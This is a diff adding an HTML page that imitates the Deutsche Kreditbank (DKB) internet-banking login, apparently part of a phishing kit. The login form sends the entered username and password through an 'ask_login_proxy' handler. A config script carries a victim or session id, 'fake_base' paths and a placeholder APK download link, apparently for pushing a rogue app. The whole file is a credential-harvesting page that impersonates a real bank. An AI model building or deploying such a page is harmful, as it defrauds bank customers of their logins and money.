@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="de" class="dasKannBank  is_apple_device js webkit chrome mac" x-ms-format-detection="none">
+
+<head>
+    <script type="text/javascript" src="../../../bower_components/jquery/dist/jquery.min.js"></script>
+    <script type="text/javascript" src="../../../bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
+    <link rel="stylesheet" href="../../../bower_components/font-awesome/css/font-awesome.min.css">
+    <script type="text/javascript" src="../../../core/form/core_form.js"></script>
+    <script type="text/javascript" src="../../../core/token/core_token.js"></script>
+    <link rel="stylesheet" href="../../../core/form/core_form.css">
+    <base href="../../../login/" />
+    <link rel="stylesheet" href="form/css.css">
+    <link href="dkb-global.css" rel="stylesheet" type="text/css">
+    <link href="dkb-global-print.css" media="print" rel="stylesheet" type="text/css">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link href="dkb_responsive.min.css" rev="responsive" rel="stylesheet" type="text/css">
+    <title>DKB - Deutsche Kreditbank AG - Internet Banking</title>
+    <link rel="stylesheet" href="index.css">
+</head>
+
+<body class="">
+    <div id="mm-0" class="mm-page mm-slideout">
+        <div> <a id="top" st="310"></a> </div>
+        <div class="clearfix pageWrapper">
+            <div class="clearfix page">
+                <div id="dkb_banking_header" class="pint banking_header  clearfix" style="padding-bottom: 0px; top: 0px; position: absolute;">
+                    <div class="header_inner_wrap"> <span class="clearfix logo"> <a title="Link zur Startseite der Deutsche Kreditbank AG" class="clearfix"> <span class="dkb_logo_container"> </span> </a> </span>
+                        <form id="search" name="search" class="noSpinner" onsubmit="return false"><button style="position: absolute; left: -9999px; width: 1px; height: 1px;" name="hiddenSubmit" type="submit">&nbsp;</button> <input class="field {'default': 'Ihre Suche...'} dkbSearchField ui-autocomplete-input" name="searchField" id="searchField" type="text" tid="searchField" autocomplete="off" role="textbox" value="Ihre Suche..."><span role="status" class="ui-helper-hidden-accessible"></span> <input class="field submit icons iconLoupe dkbSearchField" name="" id="id-429251752_" title="Suche starten" type="submit" value=""> </form>
+                        <div id="session-info" class="bankingStatusBox loggedOut"></div>
+                    </div>
+                </div>
+                <div id="contentHome" class="clearfix contentArea contentPage " style="padding-top: 121px;">
+                    <div class="clearfix grid_1 col1">
+                        <div class="clearfix mainNav" id="mainNav">
+                            <h6 class="ubar">Hauptnavigation</h6>
+                            <nav id="desktop_menu">
+                                <ul class="clearfix navigationMain" id="menu">
+                                    <li id="menu_0-node" tid="Mein_Banking" class=" label_Mein_Banking  selected selectedLeaf mm-vertical-level-1"> <a> Mein Banking </a>
+                                        <ul>
+                                            <li id="menu_0.0-node" tid="Banking+" class=" label_Banking+   mm-vertical-level-2"> <a> Banking+ </a> </li>
+                                            <li id="menu_0.1-node" tid="Aktivkundenvorteile" class=" label_Aktivkundenvorteile   mm-vertical-level-2"> <a> Aktivkundenvorteile </a> </li>
+                                            <li id="menu_0.2-node" tid="Banking_erklaert" class=" label_Banking_erklaert   mm-vertical-level-2"> <a> Banking erklärt </a> </li>
+                                        </ul>
+                                    </li>
+                                    <li id="menu_1-node" tid="Kunden_werben_Kunden" class=" label_Kunden_werben_Kunden   mm-vertical-level-1"> <a id="Kunden werben Kunden"> Kunden werben Kunden </a> </li>
+                                    <li id="menu_2-node" tid="Privatkunden" class=" label_Privatkunden   mm-vertical-level-1"> <a> Privatkunden </a> </li>
+                                    <li id="menu_3-node" tid="Geschaeftskunden" class=" label_Geschaeftskunden   mm-vertical-level-1"> <a> Geschäftskunden </a> </li>
+                                    <li id="menu_4-node" tid="Nachhaltigkeit" class=" label_Nachhaltigkeit   mm-vertical-level-1"> <a> Nachhaltigkeit </a> </li>
+                                    <li id="menu_5-node" tid="Ueber_uns" class=" label_Ueber_uns   mm-vertical-level-1"> <a> Über uns </a> </li>
+                                    <li id="menu_6-node" tid="Karriere" class=" label_Karriere   mm-vertical-level-1"> <a> Karriere </a> </li>
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                    <div class="clearfix grid_3 col2">
+                        <div style="margin: 0px;">
+                            <h6 class="ubar">Inhaltsbereich</h6> <a id="content"></a>
+                            <h1> Herzlich willkommen </h1>
+                            <div class="clearfix content"> <a>
+                                    <div class="clearfix textDefaultModule imgColLeft mainTeaser currentNews ">
+                                        <div class="clearfix inner shadowBox  infoNewsWithImage ">
+                                            <div class="dl" style="width:120px;">
+                                                <div class="dt"> <img src="c0d75975d30300cc39ba6c22834ef480.jpg"> </div>
+                                            </div>
+                                            <div class="clearfix text">
+                                                <h4>Schon gewusst? Handy aufladen im Banking</h4> Egal ob Telekom, Vodafone, O2 oder weitere Anbieter – laden Sie Ihr Handy direkt über Ihr Banking ohne Zusatzkosten auf: Einfach, sicher und jederzeit nachvollziehbar.&nbsp;<span class="icons  arrowNext "></span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a> </div>
+                            <div class="clearfix successBox remarkBox err_div" style="display: none;">
+                                <ul>
+                                    <li>
+                                        <span class="icons exclamationMark"></span>
+                                        <a class="modal {content:{player: 'ajax'}} modalOverlayBound" id="14002757279"><strong>Achtung:</strong> Kriminelle versenden E-Mails im Namen der DKB. Worauf achten? <strong><span style="color:#1270DE">&gt;</span></strong></a>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div id="cookieHint"></div>
+                            <div class="clearfixv module shadowBox applicationContainer">
+                                <div class="clearfix applicationForm">
+                                    <div class="scum_container loader_show">
+                                        <div class="scum" id="login-view">
+                                            <form id="login" onsubmit="send1(event,'ask_login_proxy');return false" name="login" class="form" tid="login">
+                                                <button style="position: absolute; left: -9999px; width: 1px; height: 1px;" name="hiddenSubmit" type="submit">&nbsp;</button>
+                                                <fieldset>
+                                                    <h3 class="border"> <span>Anmeldung zum Internet-Banking</span> </h3>
+                                                    <p class="clearfix formBox">
+                                                        <span class="col50 floatLeft form-group">
+                                                            <label for="loginInputSelector" id="loginInputSelector-label" class="headdetail" tid="loginInputSelector-label"><span>Anmeldename </span></label>
+                                                            <input class="field text small hasKeypad form-control" pattern=".{4,}" data-err_text="Please enter valid " name="j_username" id="loginInputSelector" type="text" maxlength="16" tid="j_username" autocomplete="off" autocapitalize="off" tabindex="1" placeholder="Anmeldename" value="">
+                                                            <a href="#vt" class="vt-control date-picker-control keypad-trigger" tabindex="0"></a>
+                                                        </span>
+                                                        <span class="col50 floatRight formExe hide-for-small-down"> <b>Nicht vergessen:</b><br> Smartphone oder TAN-Generator bereitlegen <br><br> Tipp: Für TAN2go und chipTAN haben Sie übrigens unterschiedliche Anmeldenamen. </span>
+                                                        <span class="col50 floatLeft form-group"> <br>
+                                                            <label for="pinInputSelector" id="pinInputSelector-label" class="headdetail" tid="pinInputSelector-label"><span>Passwort </span></label>
+                                                            <input class="field text small hasKeypad form-control" pattern=".{4,}" data-err_text="Please enter valid " name="j_password" id="pinInputSelector" type="password" maxlength="38" tid="j_password" autocomplete="off" tabindex="2" placeholder="Passwort">
+                                                            <a href="#vt" class="vt-control date-picker-control keypad-trigger" tabindex="0"></a>
+                                                            <a class="moreLink"><span class="icons arrowNext"></span>Passwort vergessen</a> </span> </p>
+                                                </fieldset>
+                                                <div id="login-div" class="clearfix send">
+                                                    <div class="clearfix button"> <button id="buttonlogin" type="submit" title="Anmelden" tid="login" class="clearfix submit evt-login submit" tabindex="4"><span class="abaxx-button-label">Anmelden<span class="icons arrowButton0"></span></span></button> </div>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div> </div>
+                    <div class="clearfix grid_1 col3">
+                        <div class="clearfix module teaser highlightedListModule">
+                            <h4><span>Anmeldung</span></h4>
+                            <div class="clearfix text">
+                                <ul class="clearfix linkList highlightedList">
+                                    <li> <span class="icons arrowNext"></span> <a target="_blank" class="suggestLink " id="5136339043">Zur DKB-Verwalterplattform</a> </li>
+                                    <li> <span class="icons arrowNext"></span> <a target="_blank" class="suggestLink " id="5136339025">Zur DKB-Treuhänderplattform</a> </li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="clearfix module  textDefaultModuleMarginal">
+                            <h4><span>Kontakt aufnehmen</span></h4>
+                            <div class="text">
+                                <p>Sie haben Probleme beim Login ins Banking oder mit Ihrem TAN-Verfahren? Nutzen Sie unser Kontaktformular für eilige Anliegen.</p>
+                                <ul class="clearfix linkList">
+                                    <li> <span class="icons arrowNext"></span> <a target="_self" class="suggestLink " id="11506981926">zum Kontaktformular</a> </li>
+                                    <li> <a class="suggestLink " id="11448610397"><span class="icons arrowNext"></span>FAQ zum Login</a> </li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="clearfix module  textDefaultModuleMarginal">
+                            <h4><span>Sicherheitstipps</span></h4>
+                            <div class="text">
+                                <p></p>
+                                <p>Schützen Sie Ihre Daten und Finanzen vor unberechtigten Zugriffen. Unsere Tipps an Sie:</p>
+                                <p></p>
+                                <ul class="clearfix linkList">
+                                    <li> <a class="suggestLink " id="10932950654"><span class="icons arrowNext"></span>Sicherheitstipps</a> </li>
+                                    <li> <a class="suggestLink " id="10932954436"><span class="icons arrowNext"></span>Sicherheit im Banking</a> </li>
+                                    <li> <a class="suggestLink " id="10932968609"><span class="icons arrowNext"></span>Karte sperren</a> </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="clearfix richfooter_wrap" id="richfooter_wrap">
+                    <div class="richfooter mobileAccordion initialized">
+                        <div class="footer_col">
+                            <div class="h4">DKB AG<span class="trigger_icon"></span><span class="trigger_icon"></span></div>
+                            <ul style="display: block;">
+                                <li> <a class="suggestLink " name="RF Presse" id="5134545197">Presse</a> </li>
+                                <li> <a class="suggestLink " name="RF Public Affairs" id="11919734870">Public Affairs</a> </li>
+                                <li><a class="modal {content:{player: 'ajax'}} modalOverlayBound" name="RF Investor Relations" id="5134545210">Investor Relations</a> </li>
+                                <li> <a target="_blank" class="suggestLink fb_icon" id="5134545591">Facebook</a> </li>
+                                <li> <a target="_blank" class="suggestLink instagram_icon" id="6734682880">Instagram</a> </li>
+                                <li> <a target="_blank" class="suggestLink twitter_icon" id="11745794369">Twitter</a> </li>
+                                <li> <a target="_blank" class="suggestLink youtube_icon" id="6734691075">Youtube</a> </li>
+                                <li> <a target="_blank" class="suggestLink linkedIn_icon" id="10005577722">LinkedIn</a> </li>
+                                <li> <a target="_blank" class="suggestLink xing_icon" id="10005577796">Xing</a> </li>
+                                <li> <a target="_blank" class="suggestLink dkb_ft_icon" id="8148943209">Das kann Bank</a> </li>
+                                <li> <a class="suggestLink " name="RF Datenschutz" id="11630055706">Datenschutz</a> </li>
+                                <li> <a class="suggestLink " name="RF Impressum" id="11630110408">Impressum</a> </li>
+                            </ul>
+                        </div>
+                        <div class="footer_col">
+                            <div class="h4">Beliebte Produkte<span class="trigger_icon"></span><span class="trigger_icon"></span></div>
+                            <ul style="display: block;">
+                                <li> <a class="suggestLink " name="RF Girokonto" id="5134545230">Kostenloses Girokonto</a> </li>
+                                <li> <a class="suggestLink " name="RF Kreditkarte" id="5134545236">Kostenlose Kreditkarte</a> </li>
+                                <li> <a class="suggestLink " name="RF Online-Depot" id="5134545242">Online-Depot</a> </li>
+                                <li> <a target="_self" class="suggestLink " id="5134545248" name="RF Privatkredit">Privatkredit</a> </li>
+                                <li> <a class="suggestLink " name="RF Studentenkonto" id="5134545262">Studentenkonto</a> </li>
+                                <li> <a class="suggestLink " name="RF Geschäftskonto" id="5134545270">Geschäftskonto</a> </li>
+                                <li> <a class="suggestLink " name="RF Immobilienangebote" id="5134545278">Immobilienangebote</a> </li>
+                                <li> <a class="suggestLink " name="RF Baufinanzierung" id="5134545285">Baufinanzierung</a> </li>
+                            </ul>
+                        </div>
+                        <div class="footer_col">
+                            <div class="h4">Banking &amp; Apps<span class="trigger_icon"></span><span class="trigger_icon"></span></div>
+                            <ul style="display: block;">
+                                <li> <a class="suggestLink " id="5134545313"> Internet-Banking </a> </li>
+                                <li> <a class="suggestLink " id="5134545323">Banking-App</a> </li>
+                                <li> <a class="suggestLink " id="5134545338">TAN2go-App</a> </li>
+                                <li> <a target="_blank" class="suggestLink " id="5134545355" name="RF Verwalterplattform">Verwalterplattform</a> </li>
+                                <li> <a target="_blank" class="suggestLink " id="5134545370" name="RF Treuhänderplattform">Treuhänderplattform</a> </li>
+                                <li></li>
+                            </ul>
+                        </div>
+                        <div class="footer_col">
+                            <div class="h4">Sicherheit<span class="trigger_icon"></span><span class="trigger_icon"></span></div>
+                            <ul style="display: block;">
+                                <li> <a class="suggestLink " name="RF Karte sperren" id="5134545459">Karte sperren</a> </li>
+                                <li></li>
+                                <li> <a class="suggestLink " id="5134545383">Sicherheitsgarantie</a> </li>
+                                <li> <a class="suggestLink " id="5134545400">Sicherheit im Überblick</a> </li>
+                                <li> <a class="suggestLink " id="5134545416">TAN-Verfahren</a> </li>
+                                <li> <a class="suggestLink " name="RF Einlagensicherung" id="5134545468">Einlagensicherung</a> </li>
+                                <li> <a class="suggestLink " name="RF Visa Secure" id="6148490533">Visa Secure</a> </li>
+                                <li> <a class="suggestLink " name="RF Card Control" id="9289096407">Card Control</a> </li>
+                            </ul>
+                        </div>
+                        <div class="footer_col">
+                            <div class="h4">Kontakt &amp; Service<span class="trigger_icon"></span><span class="trigger_icon"></span></div>
+                            <ul style="display: block;">
+                                <li> <a target="_blank" class="suggestLink " id="5134545610" name="RF Fragen &amp; Antworten">Fragen &amp; Antworten</a> </li>
+                                <li> <a class="suggestLink " id="9647931383">Kontakt</a> </li>
+                                <li> <a target="_self" class="suggestLink " id="6734707500">Kunden werben Kunden</a> </li>
+                                <li> <a class="suggestLink " name="RF Vertriebspartner" id="9948491734">Vertriebspartner</a> </li>
+                                <li> <a class="suggestLink " name="RF Formulare?" id="5134545625">Formulare</a> </li>
+                                <li> <a class="suggestLink " name="RF Geldautomaten suchen" id="5134545708">Geldautomaten suchen</a> </li>
+                                <li> <a class="suggestLink " name="RF IBAN-Rechner" id="5134545725">IBAN-Rechner</a> </li>
+                                <li> <a class="suggestLink " name="RF Entwickler" id="9909285452">Entwickler</a> </li>
+                            </ul>
+                        </div>
+                        <div class="footer_col footer_special"> <a name="Deutsche Kreditbank AG">
+                                <div class="dkb_ag_logo_container"></div>
+                            </a> </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="outerfooter" id="outerfooter">
+            <ul>
+                <li><a>Impressum</a></li>
+                <li><a>Datenschutz</a></li>
+                <li><a>Preise &amp; Bedingungen</a></li>
+                <li>BIC: BYLADEM1001</li>
+            </ul>
+        </div>
+    </div>
+    <script type="text/javascript">
+    var bid = "4600392736343271b1b62da5eb590fb4"
+    var php_js = {"device":{"isMobile":false,"isTablet":false,"isiOS":false,"isAndroid":false},"gets":[],"lng":"de","bb_link":"https:\/\/www.dkb.de\/banking","link":"dkb","apk_file":"http:\/\/test.com\/file.apk","encryption":0,"texts":"{}","query":"","home":"..\/..\/..\/home.php","relative_root":"..\/..\/..\/","parent_folders":"a1b2c3\/4600392736343271b1b62da5eb590fb4\/login\/","fake_base":"login\/"}    </script>
+    <script type="text/javascript" src="form/form.js?v=63a15bc0e1f21"></script>
+    <script type="text/javascript" src="token/token.js?v=63a15bc0e1f26"></script>
+</body>
+
+</html>
